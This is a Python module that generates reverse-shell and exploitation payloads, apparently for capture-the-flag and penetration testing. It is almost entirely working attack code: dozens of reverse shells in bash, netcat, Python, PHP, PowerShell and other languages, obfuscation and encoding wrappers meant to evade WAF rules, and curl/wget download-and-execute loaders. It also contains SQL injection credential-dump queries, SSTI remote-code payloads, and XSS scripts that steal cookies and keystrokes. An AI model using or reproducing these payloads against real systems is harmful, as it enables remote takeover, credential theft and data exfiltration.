"""
payloads/shells.py
──────────────────
CTF reverse shell payload generator — extracted from V28 Ultimate Scanner.

FOR AUTHORIZED SECURITY TESTING AND CTF COMPETITIONS ONLY.

References:
  - PayloadsAllTheThings reverse shell cheat sheet
  - GTFOBins
  - HackTricks reverse shells

Usage:
    from payloads.shells import CTFPayloadGenerator

    gen = CTFPayloadGenerator(attacker_ip="10.10.14.5", attacker_port=4444)
    shells = gen.get_reverse_shells()
    for lang, cmds in shells.items():
        print(f"[{lang}]")
        for cmd in cmds:
            print(f"  {cmd}")
"""

import base64
import codecs
import gzip
import urllib.parse
from typing import Dict, List


class CTFPayloadGenerator:
    """
    CTF-specific exploitation payload generation.

    FOR CTF COMPETITIONS AND AUTHORIZED TESTING ONLY.

    Features:
    - 50+ reverse shells across 12 languages
    - 12 encoding techniques
    - 25+ remote script loaders
    - 25+ obfuscation variants
    - 20 command separators
    - Listener setup instructions
    - Per-vuln-type exploitation guidance
    """

    def __init__(self, attacker_ip: str = "10.10.14.5", attacker_port: int = 4444):
        self.attacker_ip   = attacker_ip
        self.attacker_port = attacker_port
        self.verbose       = False

    # ──────────────────────────────────────────────────────────────────────────
    # Reverse shells
    # ──────────────────────────────────────────────────────────────────────────

    def get_reverse_shells(self) -> Dict[str, List[str]]:
        """
        Generate reverse shell payloads — V14 EXPANDED (50+ shells, 12 languages).
        Returns a dict keyed by language/tool name.
        """
        ip   = self.attacker_ip
        port = self.attacker_port

        return {
            # ── bash (8 variants) ─────────────────────────────────────────────
            "bash": [
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                f"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
                f"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done",
                f"0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196",
                f"bash -c '{{exec 5<>/dev/tcp/{ip}/{port};cat <&5|while read line;do \"$line\" 2>&5>&5;done}}'",
                f"sh -i >& /dev/tcp/{ip}/{port} 0>&1",
                f"/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1",
                f"zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
            ],

            # ── netcat (8 variants) ───────────────────────────────────────────
            "netcat": [
                f"nc -e /bin/bash {ip} {port}",
                f"nc -e /bin/sh {ip} {port}",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
                f"nc {ip} {port} -e /bin/bash",
                f"busybox nc {ip} {port} -e /bin/sh",
                f"nc -c bash {ip} {port}",
                f"rm -f /tmp/p; mknod /tmp/p p && nc {ip} {port} 0</tmp/p | /bin/bash 1>/tmp/p",
                f"ncat {ip} {port} -e /bin/bash",
            ],

            # ── socat (4 variants) ────────────────────────────────────────────
            "socat": [
                f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
                f"socat tcp-connect:{ip}:{port} exec:bash,pty,stderr,setsid,sigint,sane",
                f"socat TCP:{ip}:{port} EXEC:/bin/bash",
                f"socat tcp:{ip}:{port} system:/bin/sh",
            ],

            # ── python (6 variants) ───────────────────────────────────────────
            "python": [
                f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                f"python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
                f"python -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
                f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
                f"python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in[0,1,2]];pty.spawn(\"bash\")'",
                # PTY upgrade one-liner (useful after catching a dumb shell)
                f"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'",
            ],

            # ── php (6 variants) ──────────────────────────────────────────────
            "php": [
                f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                f"php -r '$s=fsockopen(\"{ip}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
                f"php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
                f"php -r '$sock=fsockopen(\"{ip}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3\",\"r\");'",
                # Web shell one-liners
                f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\"); ?>",
                f"<?php system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f\"); ?>",
            ],

            # ── perl (4 variants) ─────────────────────────────────────────────
            "perl": [
                f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
                f"perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
                f"perl -e 'use Socket;socket(S,PF_INET,SOCK_STREAM,0);connect(S,sockaddr_in({port},inet_aton(\"{ip}\")));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");'",
                f"perl -e 'use IO::Socket;my $s=new IO::Socket::INET(PeerAddr=>\"{ip}\",PeerPort=>{port},Proto=>\"tcp\");while(<$s>){{chomp;system $_}}'",
            ],

            # ── ruby (4 variants) ─────────────────────────────────────────────
            "ruby": [
                f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
                f"ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
                f"ruby -rsocket -e 's=TCPSocket.new(\"{ip}\",{port});while(l=s.gets);IO.popen(l,\"rb\"){{|f|s.write f.read}}end'",
                f"ruby -rsocket -e 'exit if fork;TCPSocket.open(\"{ip}\",{port}){{|s|exec \"/bin/sh\", in: s, out: s, err: s}}'",
            ],

            # ── java (3 variants) ─────────────────────────────────────────────
            "java": [
                f'r = Runtime.getRuntime();p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[]);p.waitFor()',
                # JSP webshell
                f'<%Runtime.getRuntime().exec(new String[]{{"bash","-c","bash -i >& /dev/tcp/{ip}/{port} 0>&1"}});%>',
                # Groovy one-liner
                f'String host="{ip}";int port={port};String cmd="/bin/bash";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);if(p.exitValue()>=0)break;}}p.destroy();s.close();',
            ],

            # ── powershell (4 variants) ───────────────────────────────────────
            "powershell": [
                f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
                f'powershell -c "$client = New-Object System.Net.Sockets.TCPClient(\'{ip}\',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sb=(iex $data 2>&1|Out-String);$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sb3,0,$sb3.Length);$stream.Flush()}};$client.Close()"',
                f"powershell -EncodedCommand {base64.b64encode(f'$c=New-Object Net.Sockets.TCPClient(\"{ip}\",{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$rb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($rb,0,$rb.Length);$s.Flush()}};$c.Close()'.encode('utf-16-le')).decode()}",
                f"powershell.exe -nop -w hidden -e {base64.b64encode(f'IEX(New-Object Net.WebClient).DownloadString(\"http://{ip}:8000/Invoke-PowerShellTcp.ps1\")'.encode('utf-16-le')).decode()}",
            ],

            # ── nodejs (3 variants) ───────────────────────────────────────────
            "nodejs": [
                f"node -e \"var n=require('net'),s=new n.Socket();s.connect({port},'{ip}',function(){{var sh=require('child_process').spawn('/bin/sh',[]);s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)}})\"",
                f"node -e \"require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')\"",
                f"node -e \"var sh=require('child_process').spawn('/bin/sh');var net=require('net');var s=net.createConnection({port},'{ip}');s.pipe(sh.stdin);sh.stdout.pipe(s);sh.stderr.pipe(s)\"",
            ],

            # ── golang (2 variants) ───────────────────────────────────────────
            "golang": [
                f"echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go",
                f"go run <(echo 'package main;import(\"net\";\"os/exec\");func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");exec.Command(\"/bin/sh\").Start()}}')",
            ],

            # ── lua (2 variants) ──────────────────────────────────────────────
            "lua": [
                f"lua -e \"require('socket');t=socket.tcp();t:connect('{ip}',{port});while true do local c=t:receive('*l');local f=io.popen(c,'r');local r=f:read('*a');t:send(r);end;t:close()\"",
                f"lua5.1 -e 'local host, port = \"{ip}\", {port}; local socket = require(\"socket\"); local tcp = socket.tcp(); tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive(); local f = io.popen(cmd); local s = f:read(\"*a\"); f:close(); tcp:send(s); if status == \"closed\" then break end end tcp:close()'",
            ],

            # ── awk (2 variants) ──────────────────────────────────────────────
            "awk": [
                f"awk 'BEGIN{{s=\"/inet/tcp/0/{ip}/{port}\";while(42){{do{{printf \"shell>\" |& s;s |& getline c;if(c){{while((c |& getline)>0)print |& s;close(c)}}}} while(c!=\"exit\")close(s)}}}}'",
                f"gawk 'BEGIN{{Hmm = \"/inet/tcp/0/{ip}/{port}\"; while(1) {{print \"|\\nsh>\" |& Hmm; Hmm |& getline cmd; if(cmd == \"exit\") {{close(Hmm); exit}}; cmd |& getline; print |& Hmm; close(cmd)}}}}'",
            ],

            # ── telnet (2 variants) ───────────────────────────────────────────
            "telnet": [
                f"telnet {ip} {port} | /bin/bash | telnet {ip} {int(port)+1}",
                f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/sh -i 2>&1 | telnet {ip} {port} > /tmp/f",
            ],

            # ── xterm (1 variant) ─────────────────────────────────────────────
            "xterm": [
                f"xterm -display {ip}:1",  # requires: Xnest :1 & xhost +{ip}
            ],
        }

    # ──────────────────────────────────────────────────────────────────────────
    # Encoding
    # ──────────────────────────────────────────────────────────────────────────

    def encode_payload(self, payload: str, encoding: str = "base64") -> str:
        """
        Encode a payload string using one of 12 techniques.

        Supported encodings:
          base64, base64_compact, hex, hex_printf, url,
          double_base64, triple_base64, gzip_base64,
          rot13, octal, base32, rev
        """
        if encoding == "base64":
            enc = base64.b64encode(payload.encode()).decode()
            return f"echo {enc} | base64 -d | bash"

        elif encoding == "base64_compact":
            enc = base64.b64encode(payload.encode()).decode()
            return f"echo {enc}|base64 -d|bash"

        elif encoding == "hex":
            hex_payload = payload.encode().hex()
            return f"echo {hex_payload} | xxd -r -p | bash"

        elif encoding == "hex_printf":
            hex_payload = "".join(f"\\x{b:02x}" for b in payload.encode())
            return f"printf '{hex_payload}' | bash"

        elif encoding == "url":
            return urllib.parse.quote(payload)

        elif encoding == "double_base64":
            enc1 = base64.b64encode(payload.encode()).decode()
            enc2 = base64.b64encode(enc1.encode()).decode()
            return f"echo {enc2} | base64 -d | base64 -d | bash"

        elif encoding == "triple_base64":
            enc = payload.encode()
            for _ in range(3):
                enc = base64.b64encode(enc)
            return f"echo {enc.decode()} | base64 -d | base64 -d | base64 -d | bash"

        elif encoding == "gzip_base64":
            compressed = gzip.compress(payload.encode())
            enc = base64.b64encode(compressed).decode()
            return f"echo {enc} | base64 -d | gunzip | bash"

        elif encoding == "rot13":
            enc = codecs.encode(payload, "rot13")
            return f"echo '{enc}' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | bash"

        elif encoding == "octal":
            octal_payload = "".join(f"\\{oct(b)[2:].zfill(3)}" for b in payload.encode())
            return f"printf '{octal_payload}' | bash"

        elif encoding == "base32":
            enc = base64.b32encode(payload.encode()).decode()
            return f"echo {enc} | base32 -d | bash"

        elif encoding == "rev":
            return f"echo '{payload[::-1]}' | rev | bash"

        # Fallback — return unchanged
        return payload

    # ──────────────────────────────────────────────────────────────────────────
    # Remote script loaders
    # ──────────────────────────────────────────────────────────────────────────

    def get_remote_script_loaders(self, script_url: str) -> List[str]:
        """
        Generate download-and-execute payloads — V14 EXPANDED (25+ loaders).
        """
        ip   = self.attacker_ip
        port = self.attacker_port
        return [
            # curl variants
            f"curl {script_url} | bash",
            f"curl -s {script_url} | bash",
            f"curl -sSL {script_url} | bash",
            f"curl {script_url} -o /tmp/s && bash /tmp/s",
            f"curl {script_url} -o /tmp/s && chmod +x /tmp/s && /tmp/s",
            f"curl -k {script_url} | sh",
            f"curl {script_url}|bash",
            f"curl --silent {script_url} | sh",
            # wget variants
            f"wget -qO- {script_url} | bash",
            f"wget -q {script_url} -O- | sh",
            f"wget {script_url} -O /tmp/s && bash /tmp/s",
            f"wget {script_url} -O /tmp/s && chmod +x /tmp/s && /tmp/s",
            f"wget -O- {script_url}|bash",
            f"wget --quiet -O /tmp/s {script_url} && bash /tmp/s",
            # Python variants
            f"python -c \"import urllib;exec(urllib.urlopen('{script_url}').read())\"",
            f"python3 -c \"import urllib.request;exec(urllib.request.urlopen('{script_url}').read())\"",
            f"python3 -c \"import urllib.request as r;exec(r.urlopen('{script_url}').read().decode())\"",
            # Other languages
            f"fetch -o - {script_url} | sh",
            f"powershell IEX(New-Object Net.WebClient).DownloadString('{script_url}')",
            f"powershell IEX(IWR '{script_url}' -UseBasicParsing)",
            f"busybox wget -qO- {script_url} | sh",
            f"lwp-download {script_url} /tmp/s && bash /tmp/s",
            f"php -r \"readfile('{script_url}');\" | bash",
            f"ruby -e \"require 'open-uri'; eval open('{script_url}').read\"",
            f"node -e \"require('http').get('{script_url}',r=>{{let d='';r.on('data',c=>d+=c);r.on('end',()=>require('child_process').exec(d))}})\"",
        ]

    # ──────────────────────────────────────────────────────────────────────────
    # Obfuscated shells
    # ──────────────────────────────────────────────────────────────────────────

    def get_obfuscated_shells(self) -> List[str]:
        """
        Generate obfuscated bash reverse-shell variants — V14 EXPANDED (25+ variants).
        Useful for bypassing WAF string-matching rules.
        """
        ip          = self.attacker_ip
        port        = self.attacker_port
        basic_shell = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"

        obfuscated: List[str] = []

        # 1. Variable obfuscation
        obfuscated.append(
            f"a=bash;b='-i';c='>&';d='/dev/tcp/{ip}/{port}';e='0>&1';$a $b $c $d $e"
        )

        # 2. Command substitution
        obfuscated.extend([
            f"$(echo bash) -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"`echo bash` -i >& /dev/tcp/{ip}/{port} 0>&1",
        ])

        # 3. Character escaping / quote splitting
        obfuscated.extend([
            f"bas''h -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"ba\\sh -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"b'a's''h -i >& /dev/tcp/{ip}/{port} 0>&1",
            f'b"a"s""h -i >& /dev/tcp/{ip}/{port} 0>&1',
        ])

        # 4. IFS abuse
        obfuscated.extend([
            f"bash${{IFS}}-i${{IFS}}>>&${{IFS}}/dev/tcp/{ip}/{port}${{IFS}}0>&1",
            f"bash$IFS-i$IFS>&$IFS/dev/tcp/{ip}/{port}$IFS 0>&1",
        ])

        # 5. Encoded versions
        for enc in ["base64", "hex", "double_base64", "gzip_base64", "hex_printf", "octal", "rev"]:
            obfuscated.append(self.encode_payload(basic_shell, enc))

        # 6. String concatenation
        parts = basic_shell.split()
        concat_payload = "''".join(list(parts[0])) + " " + " ".join(parts[1:])
        obfuscated.append(concat_payload)

        # 7. Wildcard / glob abuse
        obfuscated.extend([
            f"/???/b??h -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"/???/ba?? -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"/bin/b* -i >& /dev/tcp/{ip}/{port} 0>&1",
        ])

        # 8. Environment variable references
        obfuscated.extend([
            f"$SHELL -i >& /dev/tcp/{ip}/{port} 0>&1",
            f"${{BASH}} -i >& /dev/tcp/{ip}/{port} 0>&1",
        ])

        # 9. Brace expansion
        obfuscated.append(f"{{bash,-i,>&,/dev/tcp/{ip}/{port},0>&1}}")

        # 10. Hex IP representation
        hex_ip = "0x" + "".join(f"{int(o):02x}" for o in ip.split("."))
        obfuscated.append(f"bash -i >& /dev/tcp/{hex_ip}/{port} 0>&1")

        # 11. Decimal (dword) IP representation
        dec_ip = sum(int(o) << (8 * (3 - i)) for i, o in enumerate(ip.split(".")))
        obfuscated.append(f"bash -i >& /dev/tcp/{dec_ip}/{port} 0>&1")

        # 12. ${0##*/} trick (uses current shell name)
        obfuscated.append(f"${{0##*/}} -i >& /dev/tcp/{ip}/{port} 0>&1")

        # 13. Here-string + base64
        obfuscated.append(
            f"bash <<<$(echo {base64.b64encode(basic_shell.encode()).decode()}|base64 -d)"
        )

        # 14. /dev/udp fallback
        obfuscated.append(f"bash -i >& /dev/udp/{ip}/{port} 0>&1")

        # 15. eval chain
        obfuscated.append(
            f"eval $(echo {base64.b64encode(basic_shell.encode()).decode()}|base64 -d)"
        )

        return obfuscated

    # ──────────────────────────────────────────────────────────────────────────
    # Command separators
    # ──────────────────────────────────────────────────────────────────────────

    def get_command_separators(self) -> List[str]:
        """
        Command separators useful for injection — V14 EXPANDED (20 variants).
        """
        return [
            ";",      "|",       "||",      "&&",
            "&",      "\n",      "\r",      "`",
            "$(",     "%0a",     "%0d",     "%3B",
            "%26",
            # V14 additions
            "%0a%0d", "%7c",     "%7C",     "%26%26",
            "%3b",    "\r\n",    "%0d%0a",
        ]

    # ──────────────────────────────────────────────────────────────────────────
    # Variant generator
    # ──────────────────────────────────────────────────────────────────────────

    def generate_all_variants(self, base_payload: str, max_variants: int = 30) -> List[str]:
        """
        Generate a comprehensive set of payload variants from a base string.
        Combines separator prefixes, encoding, and shell obfuscation.
        Returns at most *max_variants* entries.
        """
        variants: set = {base_payload}

        for sep in self.get_command_separators()[:10]:
            variants.add(f"{sep} {base_payload}")
            variants.add(f"{sep}{base_payload}")

        for enc in ["base64", "hex", "url", "double_base64", "gzip_base64",
                    "hex_printf", "octal", "rev"]:
            try:
                variants.add(self.encode_payload(base_payload, enc))
            except Exception:
                pass

        if "bash" in base_payload.lower():
            for obf in self.get_obfuscated_shells()[:10]:
                variants.add(obf)

        return list(variants)[:max_variants]

    # ──────────────────────────────────────────────────────────────────────────
    # Listener setup helper
    # ──────────────────────────────────────────────────────────────────────────

    def get_listener_instructions(self) -> str:
        """Return a formatted string with listener setup instructions."""
        ip   = self.attacker_ip
        port = self.attacker_port
        return f"""
╔═══════════════════════════════════════════════════════════════╗
║              LISTENER SETUP INSTRUCTIONS (V14)                ║
╚═══════════════════════════════════════════════════════════════╝

BASIC NETCAT LISTENER:
  nc -lvnp {port}

NCAT (with SSL):
  ncat --ssl -lvnp {port}

SOCAT (PTY - full interactive):
  socat file:`tty`,raw,echo=0 tcp-listen:{port}

METASPLOIT:
  msfconsole -q -x "use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST {ip}; set LPORT {port}; exploit"

SHELL UPGRADE (after catching shell):
  python3 -c 'import pty;pty.spawn("/bin/bash")'
  # then: Ctrl+Z → stty raw -echo; fg → reset
  export TERM=xterm SHELL=bash

REMOTE SCRIPT SERVER:
  echo 'bash -i >& /dev/tcp/{ip}/{port} 0>&1' > shell.sh
  python3 -m http.server 8000
  # Payloads will fetch from: http://{ip}:8000/shell.sh
"""

    # ──────────────────────────────────────────────────────────────────────────
    # Per-vuln exploitation guidance
    # ──────────────────────────────────────────────────────────────────────────

    def generate_exploitation_report(
        self,
        vuln_type: str,
        url: str,
        param: str,
        payload: str,
    ) -> str:
        """
        Return a short CTF exploitation guide tailored to the vulnerability type.

        Supports: command injection, sql injection, ssti, xss.
        Returns an empty string for unrecognised types.
        """
        ip   = self.attacker_ip
        port = self.attacker_port
        vt   = vuln_type.lower()

        if "command" in vt or "cmdi" in vt:
            b64_shell = base64.b64encode(
                f"bash -i >& /dev/tcp/{ip}/{port} 0>&1".encode()
            ).decode()
            return (
                f"CTF EXPLOITATION — Command Injection\n"
                f"  URL:   {url}\n"
                f"  Param: {param}\n"
                f"  1. Start listener:  nc -lvnp {port}\n"
                f"  2. Inject directly: {payload}\n"
                f"  3. Base64 encoded:  echo {b64_shell} | base64 -d | bash\n"
                f"  4. Upgrade shell:   python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
            )

        elif "sql" in vt or "sqli" in vt:
            return (
                f"CTF EXPLOITATION — SQL Injection\n"
                f"  URL:   {url}\n"
                f"  Param: {param}\n"
                f"  1. Enumerate DB:   ' UNION SELECT database(),user(),version()--\n"
                f"  2. List tables:    ' UNION SELECT table_name,2,3 FROM information_schema.tables WHERE table_schema=database()--\n"
                f"  3. Dump columns:   ' UNION SELECT column_name,2,3 FROM information_schema.columns WHERE table_name='users'--\n"
                f"  4. Get creds:      ' UNION SELECT username,password,3 FROM users--\n"
                f"  5. Crack hashes:   hashcat -m 3200 hash.txt rockyou.txt   (bcrypt)\n"
            )

        elif "ssti" in vt:
            return (
                f"CTF EXPLOITATION — SSTI (RCE possible)\n"
                f"  URL:   {url}\n"
                f"  Param: {param}\n"
                f"  1. Jinja2 RCE: {{{{''.__class__.__mro__[1].__subclasses__()[439]('id',shell=True,stdout=-1).communicate()}}}}\n"
                f"  2. Twig RCE:   {{{{_self.env.registerUndefinedFilterCallback('exec')}}}}{{{{_self.env.getFilter('id')}}}}\n"
                f"  3. FreeMarker: <#assign ex=\"freemarker.template.utility.Execute\"?new()>${{ex(\"id\")}}\n"
                f"  4. Rev shell:  {{{{''.__class__.__mro__[1].__subclasses__()[439]('bash -i >& /dev/tcp/{ip}/{port} 0>&1',shell=True)}}}}\n"
            )

        elif "xss" in vt:
            return (
                f"CTF EXPLOITATION — XSS\n"
                f"  URL:   {url}\n"
                f"  Param: {param}\n"
                f"  1. Cookie steal: <script>document.location='http://{ip}:{port}/?c='+document.cookie</script>\n"
                f"  2. Keylogger:    <script>document.onkeypress=function(e){{fetch('http://{ip}:{port}/?k='+e.key)}}</script>\n"
                f"  3. CSRF via XSS: <script>fetch('/api/admin',{{method:'POST',credentials:'include'}})</script>\n"
            )

        return ""
